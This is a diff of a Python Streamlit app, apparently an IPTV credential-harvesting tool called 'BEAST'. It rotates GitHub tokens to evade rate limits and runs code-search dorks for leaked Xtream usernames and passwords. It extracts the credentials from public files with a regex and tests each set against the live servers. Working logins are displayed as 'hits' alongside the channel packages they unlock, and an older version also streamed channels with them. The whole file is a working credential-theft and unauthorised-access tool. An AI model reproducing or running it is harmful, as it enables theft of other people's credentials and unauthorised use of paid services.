@@ -2,138 +2,129 @@ import streamlit as st
 import requests
 import re
 import time
-import threading
+from datetime import datetime
 
 # إعدادات الواجهة
-st.set_page_config(page_title="BEAST V35 - ZERO BYPASS", layout="wide")
-
-if "hits" not in st.session_state: st.session_state.hits = []
-if "logs" not in st.session_state: st.session_state.logs = []
-if "auth" not in st.session_state: st.session_state.auth = False
+st.set_page_config(page_title="BEAST V36 - MULTI-TOKEN", layout="wide")
 
 # نظام الدخول
+if "auth" not in st.session_state:
+    st.session_state.auth = False
+
 if not st.session_state.auth:
-    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V35 - ZERO BYPASS</h1>", unsafe_allow_html=True)
-    pwd = st.text_input("كلمة السر:", type="password")
+    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V36 - MULTI-TOKEN FEED</h1>", unsafe_allow_html=True)
+    pwd = st.text_input("Password:", type="password")
     if st.button("دخول"):
         if pwd == "BEAST_V17_PRO":
             st.session_state.auth = True
             st.rerun()
     st.stop()
 
-# تصميم احترافي
+# تنسيق الألوان الاحترافي
 st.markdown("""
 <style>
-    .stApp { background-color: #000; color: #fff; }
-    .hit-card { background: #0d1117; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; margin-bottom: 10px; }
-    .log-box { background: #111; color: #00d4ff; padding: 10px; font-family: monospace; font-size: 11px; height: 150px; overflow-y: auto; border: 1px solid #333; }
+    .stApp { background-color: #000; }
+    .scan-log { color: #00d4ff; font-family: monospace; font-size: 12px; margin: 0; padding: 2px; border-bottom: 1px solid #111; }
+    .active-hit { 
+        background: #0d1117; border: 1px solid #00ff41; 
+        padding: 15px; border-radius: 8px; margin-bottom: 10px;
+        box-shadow: 0 0 10px rgba(0,255,65,0.1);
+    }
+    .text-green { color: #00ff41; font-weight: bold; font-size: 16px; }
+    .text-yellow { color: #fbbf24; font-weight: bold; }
+    .text-white { color: #fff; font-family: monospace; }
+    .cat-list { color: #888; font-size: 11px; margin-top: 5px; font-style: italic; }
 </style>
 """, unsafe_allow_html=True)
 
-# --- المحرك القناص ---
-def beast_scanner(tokens):
-    # دروكات متنوعة جداً لكسر الحظر
-    queries = [
-        'extension:txt "get.php?username="',
-        'extension:m3u8 "password=" "http"',
-        'filename:config.php "db_user"',
-        'extension:json "server_url"',
-        'extension:m3u "player_api.php"'
+# الجانب الجانبي للتحكم
+with st.sidebar:
+    st.title("⚡ BEAST V36")
+    tokens_raw = st.text_area("أدخل التوكنات (كل توكن في سطر):", height=150, placeholder="ghp_xxx\nghp_yyy")
+    tokens = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
+    
+    st.divider()
+    search_depth = st.slider("عمق البحث (عدد الصفحات):", 1, 50, 20)
+    start = st.button("🚀 إطلاق الهجوم الشامل")
+    
+    if tokens:
+        st.success(f"تم تفعيل {len(tokens)} توكنات")
+
+# مناطق العرض
+st.subheader("📡 الرادار المباشر (فحص التوكنات والروابط)")
+radar_area = st.empty() 
+
+st.subheader("🏆 النتائج المكتشفة (Hits)")
+hits_area = st.container()
+
+# المحرك الرئيسي
+if start and tokens:
+    found_count = 0
+    token_index = 0
+    
+    # أقوى دروكات لجلب نتائج عربية وعالمية ضخمة
+    dorks = [
+        'extension:txt "get.php?username=" "password="', 
+        'extension:m3u "player_api.php"',
+        'extension:php "panel_api.php" username password',
+        '"http://" "username=" "password=" "port" extension:txt',
+        'extension:json "server_url" "username"',
+        'extension:m3u8 "username=" "password="',
+        'filename:.env "XTREAM_PASSWORD"',
+        'path:etc/php "get.php?username="'
     ]
     
-    t_idx = 0
-    for query in queries:
-        for page in range(1, 20):
+    for dork in dorks:
+        for page in range(1, search_depth + 1):
+            # تبديل التوكن تلقائياً لتجنب الحظر
+            current_token = tokens[token_index % len(tokens)]
+            headers = {
+                'Authorization': f'token {current_token}', 
+                'Accept': 'application/vnd.github.v3+json'
+            }
+            
             try:
-                current_token = tokens[t_idx % len(tokens)]
-                headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
+                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
+                res = requests.get(search_url, headers=headers).json()
                 
-                # إضافة معلمة عشوائية للرابط لكسر الكاش والحظر
-                search_url = f"https://api.github.com/search/code?q={query}&page={page}&per_page=100&s=indexed&cache_bust={time.time()}"
-                res = requests.get(search_url, headers=headers)
-                
-                if res.status_code == 403:
-                    st.session_state.logs.insert(0, f"⚠️ التوكن {t_idx+1} محظور مؤقتاً.. تبديل...")
-                    t_idx += 1
+                # إذا تم حظر التوكن الحالي، انتقل للتالي
+                if "items" not in res:
+                    radar_area.warning(f"Token {token_index + 1} Limited! Switching...")
+                    token_index += 1
+                    time.sleep(1)
                     continue
-                
-                data = res.json()
-                if "items" not in data: continue
 
-                for item in data['items']:
+                for item in res['items']:
                     raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
-                    content = requests.get(raw_url, timeout=2).text
-                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
-                    
-                    for host, user, pw in matches:
-                        hit = {"host": host, "user": user, "pw": pw}
-                        if hit not in st.session_state.hits:
-                            st.session_state.hits.insert(0, hit)
-                            st.session_state.logs.insert(0, f"✅ تم العثور على: {host}")
-            except:
-                t_idx += 1
+                    try:
+                        content = requests.get(raw_url, timeout=3).text
+                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
+                        
+                        for m in matches:
+                            host, user, pw = m[0], m[1], m[2]
+                            radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host}</p>", unsafe_allow_html=True)
+                            
+                            try:
+                                # الفحص وجلب البيانات
+                                api_url = f"{host}/player_api.php?username={user}&password={pw}"
+                                r = requests.get(api_url, timeout=2).json()
+                                
+                                if r.get("user_info", {}).get("status") == "Active":
+                                    # جلب عينة من الباقات والقنوات
+                                    cat_res = requests.get(f"{api_url}&action=get_live_categories", timeout=2).json()
+                                    cat_names = [c['category_name'] for c in cat_res[:8]] if isinstance(cat_res, list) else ["No Categories"]
+                                    
+                                    found_count += 1
+                                    with hits_area:
+                                        st.markdown(f"""
+                                        <div class="active-hit">
+                                            <span class="text-green">✅ HIT #{found_count} - {host}</span><br>
+                                            <span class="text-white">LOGIN: {user} | PASS: {pw}</span><br>
+                                            <div class="cat-list">📦 الباقات: {" | ".join(cat_names)}</div>
+                                        </div>
+                                        """, unsafe_allow_html=True)
+                            except: continue
+                    except: continue
+            except Exception as e:
+                token_index += 1
                 continue
-
-# --- الواجهة الرئيسية ---
-col1, col2 = st.columns([1, 2])
-
-with col1:
-    st.header("⚙️ التحكم")
-    t_input = st.text_area("أدخل التوكنات (كل واحد في سطر):", height=200)
-    if st.button("🚀 بدء الهجوم العنيف"):
-        t_list = [t.strip() for t in t_input.split('\n') if t.strip()]
-        if t_list:
-            st.session_state.hits = []
-            threading.Thread(target=beast_scanner, args=(t_list,), daemon=True).start()
-        else: st.error("أدخل التوكنات أولاً!")
-    
-    st.subheader("📝 سجل الأحداث")
-    st.markdown(f'<div class="log-box">{"<br>".join(st.session_state.logs)}</div>', unsafe_allow_html=True)
-
-with col2:
-    st.header(f"📊 النتائج المباشرة: {len(st.session_state.hits)}")
-    if not st.session_state.hits:
-        st.warning("في انتظار النتائج... إذا طال الانتظار، فالتوكنات ضعيفة أو محظورة.")
-    
-    for h in st.session_state.hits:
-        with st.container():
-            st.markdown(f"""
-            <div class="hit-card">
-                <b>HOST:</b> <span style="color:#00ff41;">{h['host']}</span><br>
-                <b>USER:</b> {h['user']} | <b>PASS:</b> {h['pw']}<br>
-                <small style="color:#888;">URL: {h['host']}/get.php?username={h['user']}&password={h['pw']}&type=m3u_plus&output=ts</small>
-            </div>
-            """, unsafe_allow_html=True)
-            if st.button(f"📺 تشغيل {h['host'][:20]}", key=h['host']+h['user']):
-                st.session_state.target_srv = h
-
-# --- مشغل إكستريم مدمج ---
-if "target_srv" in st.session_state:
-    st.divider()
-    srv = st.session_state.target_srv
-    st.subheader(f"🎬 مشغل BEAST للسيرفر: {srv['host']}")
-    
-    try:
-        api_url = f"{srv['host']}/player_api.php?username={srv['user']}&password={srv['pw']}"
-        # جلب القنوات
-        channels = requests.get(f"{api_url}&action=get_live_streams", timeout=5).json()
-        
-        search_ch = st.text_input("🔍 بحث في القنوات (مثلاً: bein, ssc)...")
-        
-        c_list, c_vid = st.columns([1, 2])
-        with c_list:
-            for ch in channels[:100]: # عرض أول 100 قناة للسرعة
-                if search_ch.lower() in ch['name'].lower():
-                    if st.button(ch['name'], key=f"ch_{ch['stream_id']}", use_container_width=True):
-                        st.session_state.video_url = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.ts"
-        
-        with c_vid:
-            if "video_url" in st.session_state:
-                st.video(st.session_state.video_url)
-                st.code(st.session_state.video_url)
-    except:
-        st.error("فشل الاتصال بمشغل السيرفر. قد يكون السيرفر محمياً أو مغلقاً.")
-
-# تحديث تلقائي لرؤية النتائج فور ظهورها
-time.sleep(2)
-st.rerun()
